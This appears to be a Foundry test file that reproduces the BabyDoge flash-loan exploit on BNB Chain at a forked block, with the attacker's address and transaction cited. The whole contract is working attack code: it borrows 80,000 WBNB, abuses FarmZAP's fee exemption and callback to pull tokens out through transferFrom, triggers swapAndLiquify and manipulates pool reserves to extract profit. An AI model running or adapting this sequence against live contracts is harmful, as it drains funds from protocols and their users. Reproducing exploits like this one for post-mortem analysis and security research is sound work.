pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface/interfaces.sol";


interface IFarm {
    function depositOnBehalf(uint256 amount, address account) external;
    function stakeToken() external returns (address);
}

interface IFarmZAP {
    function buyTokensAndDepositOnBehalf(
        IFarm farm,
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path
    ) external payable returns (uint256);
}

// Attacker : https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb
// Attack Contract : https://bscscan.com/address/0x51873a0b615a51115f2cfbc2e24d9db4bfa2e6e2
// Vulnerable Contract : https://bscscan.com/address/0xc748673057861a797275cd8a068abb95a902e8de
// Attack Tx : https://bscscan.com/tx/0x098e7394a1733320e0887f0de22b18f5c71ee18d48a0f6d30c76890fb5c85375

// @Analysis
// Post-mortem : https://medium.com/@MetatrustL/cracking-the-code-delving-into-the-elaborate-scheme-behind-babydoge-coins-flash-loan-attack-9c94f59041ff
// Twitter Guy : https://twitter.com/MetaTrustAlert/status/1662835458722910209

contract BabyDogeCoinTest is Test {
    DeflationaryToken BabyDoge = DeflationaryToken(0xc748673057861a797275CD8A068AbB95A902e8de);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Pair PancakePair = IUniswapV2Pair(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
    IFarmZAP FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
    IAaveFlashloan Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    bool isBABYDOGE = true;

    function setUp() public {
        vm.createSelectFork("bsc", 28_593_354);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BabyDoge), "BabyDoge");
        vm.label(address(PancakePair), "PancakePair");
        vm.label(address(FarmZAP), "FarmZAP");
        vm.label(address(Radiant), "Radiant");

    }

    function test() public {
        address[] memory assets = new address[](1);
        assets[0] = address(WBNB);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 * 1e18;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        
        emit log_named_decimal_uint("[Start] Attacker WBNB Balance", WBNB.balanceOf(address(this)), WBNB.decimals());

        uint balanceBefore = WBNB.balanceOf(address(this));
        // 1. Get 80,000 BNB with a flash loan from Radiant: Lending Pool;
        Radiant.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
        uint balanceAfter = WBNB.balanceOf(address(this));
        assert(balanceAfter > balanceBefore);

        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals());
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        //The FarmZAP is a fee-free address from BabyDoge
        assert(BabyDoge.isExcludedFromFee(address(FarmZAP)));
        
        WBNB.approve(address(Radiant), amounts[0] + premiums[0]);
        WBNB.withdraw(80_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BabyDoge);
        // 2. Call the buyTokensAndDepositOnBehalf function of  FarmZAP to swap 80,000 $BNB for 3,529,864,186,667,202 $BabyDoge from the TreatSwap pair;
        FarmZAP.buyTokensAndDepositOnBehalf{value: 80_000 ether}(IFarm(address(this)), 80_000 * 1e18, 0, path);

        // 3. Swap $BabyDoge for $BNB on PancakeSwap pair;
        SwapBabyDogeForWBNBInPancake();

        // 4. Trigger the swapAndLiquify action on the PancakeSwap pair;
        BabyDoge.transferFrom(address(FarmZAP), address(BabyDoge), BabyDoge.numTokensSellToAddToLiquidity() - BabyDoge.balanceOf(address(BabyDoge)));
        BabyDoge.transferFrom(address(FarmZAP), address(this), 1);

        // 5. Swap $BNB for $BabyDoge on the PancakeSwap pair;
        SwapWBNBForBabyDogeInPancake();
        WBNB.withdraw(0.001 ether);
        FarmZAP.buyTokensAndDepositOnBehalf{value: 0.001 ether}(IFarm(address(this)), 1e15, 0, path);
        
        // 6. Swap $BabyDoge for $BNB on TreatSwap pair;
        SwapBabyDogeToWBNBInFarmZAP();
        return true;
    }

    function SwapBabyDogeForWBNBInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = PancakePair.getReserves();
        BabyDoge.transferFrom(address(FarmZAP), address(PancakePair), BABYReserve * 769 / 1000);
        uint256 amountIn = BabyDoge.balanceOf(address(PancakePair)) - BABYReserve;
        uint256 amountOut = (9975 * amountIn * WBNBReserve) / (10_000 * BABYReserve + 9975 * amountIn);
        PancakePair.swap(amountOut, 0, address(this), new bytes(0));
    }

    function SwapWBNBForBabyDogeInPancake() internal {
        (uint256 WBNBReserve, uint256 BABYReserve,) = PancakePair.getReserves();
        WBNB.transfer(address(PancakePair), WBNBReserve * 767 / 1000);
        uint256 amountIn = WBNB.balanceOf(address(PancakePair)) - WBNBReserve;
        uint256 amountOut = (9975 * amountIn * BABYReserve) / (10_000 * WBNBReserve + 9975 * amountIn);
        PancakePair.swap(0, amountOut, address(FarmZAP), new bytes(0));
    }

    function SwapBabyDogeToWBNBInFarmZAP() internal {
        BabyDoge.transferFrom(address(FarmZAP), address(this), BabyDoge.balanceOf(address(FarmZAP)));
        BabyDoge.approve(address(FarmZAP), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BabyDoge);
        path[1] = address(WBNB);
        isBABYDOGE = false;
        FarmZAP.buyTokensAndDepositOnBehalf(IFarm(address(this)), BabyDoge.balanceOf(address(this)), 0, path);
        WBNB.transferFrom(address(FarmZAP), address(this), WBNB.balanceOf(address(FarmZAP)));
    }

    receive() external payable {}

    function depositOnBehalf(uint256 amount, address account) external {}

    function stakeToken() external returns (address) {
        if (isBABYDOGE) {
            return address(BabyDoge);
        } else {
            return address(WBNB);
        }
    }
}